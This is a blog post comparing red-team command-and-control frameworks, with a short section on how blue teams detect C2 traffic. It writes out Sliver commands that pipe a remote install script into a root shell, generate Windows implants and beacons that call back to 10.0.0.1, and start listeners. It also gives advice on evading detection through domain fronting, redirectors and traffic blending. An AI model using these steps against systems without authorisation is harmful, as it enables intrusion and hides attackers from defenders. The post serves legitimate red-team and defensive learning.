---
title: "Red Team C2 Frameworks: A Comparative Analysis"
date: 2025-01-09
description: "Comparing popular Command and Control frameworks used in red team operations, including features, evasion capabilities, and deployment considerations."
tags: ["red-team", "c2", "pentesting", "tools", "cobalt-strike"]
categories: ["Red Team"]
image: "https://picsum.photos/seed/c2red17/800/400"
authors:
  - name: "0xrh0d4m1n"
    link: "https://github.com/0xrh0d4m1n"
    image: "https://github.com/0xrh0d4m1n.png"
---

## What is a C2 Framework?

A Command and Control (C2) framework provides the **infrastructure for managing implants** on compromised systems during red team engagements. Choosing the right framework depends on the engagement objectives, target environment, and operational security requirements.

## Framework Comparison

| Framework | Language | License | Protocols | GUI | Active Dev |
|-----------|----------|---------|-----------|-----|------------|
| Cobalt Strike | Java | Commercial | HTTP/S, DNS, SMB | Yes | Yes |
| Sliver | Go | Open Source | HTTP/S, DNS, mTLS, WireGuard | Yes | Yes |
| Havoc | C/C++ | Open Source | HTTP/S | Yes | Yes |
| Mythic | Python/Go | Open Source | HTTP, WebSocket, custom | Yes | Yes |
| Covenant | C# | Open Source | HTTP/S | Yes | Limited |
| Merlin | Go | Open Source | HTTP/2, HTTP/3 | CLI | Yes |

## Sliver: Modern Open-Source C2

Sliver has become a popular *open-source alternative* to Cobalt Strike:

```bash
# Install Sliver server
curl https://sliver.sh/install | sudo bash

# Start the server
sliver-server

# Generate an implant
sliver > generate --mtls 10.0.0.1 --os windows --arch amd64 --save /tmp/implant.exe

# Start a listener
sliver > mtls --lport 8888

# After callback, interact with session
sliver > use <session-id>
sliver (IMPLANT) > whoami
sliver (IMPLANT) > ps
sliver (IMPLANT) > netstat
```

### Sliver Implant Types

- **Session** -- real-time interactive connection
- **Beacon** -- asynchronous check-in at defined intervals (stealthier)

```bash
# Generate a beacon implant
sliver > generate beacon --mtls 10.0.0.1 \
  --seconds 30 --jitter 20 \
  --os windows --save /tmp/beacon.exe
```

## Operational Security Considerations

### Infrastructure Setup

1. Use **redirectors** to hide the true C2 server
2. Deploy behind CDNs (domain fronting where possible)
3. Register aged domains that blend with normal traffic
4. Use valid SSL certificates from trusted CAs
5. Rotate infrastructure regularly during engagements

### Traffic Blending

```json
{
  "http_config": {
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "headers": {
      "Accept": "text/html,application/json",
      "Accept-Language": "en-US,en;q=0.9"
    },
    "uri_paths": ["/api/v2/status", "/cdn/assets", "/update/check"],
    "jitter": 20
  }
}
```

## Detection from the Blue Team Side

Blue teams should look for these C2 indicators:

- **Beaconing patterns** -- regular interval connections to the same destination
- **Unusual User-Agents** -- default or misconfigured C2 profiles
- **DNS anomalies** -- high-entropy subdomains, TXT record abuse
- **Certificate mismatches** -- self-signed or mismatched SSL certs
- **Process injection** -- unusual parent-child process relationships

> The best red teams think like blue teams when designing their infrastructure. Understanding detection capabilities helps build more realistic and valuable assessments.

## Choosing a Framework

Consider these factors:

- **Engagement scope** -- external vs. internal, duration
- **Target environment** -- Windows-heavy, Linux, mixed
- **Evasion requirements** -- EDR maturity of the target
- **Team expertise** -- familiarity with the framework
- **Reporting** -- built-in logging and evidence collection

Choose frameworks that support your engagement objectives while maintaining *operational discipline* and thorough documentation.
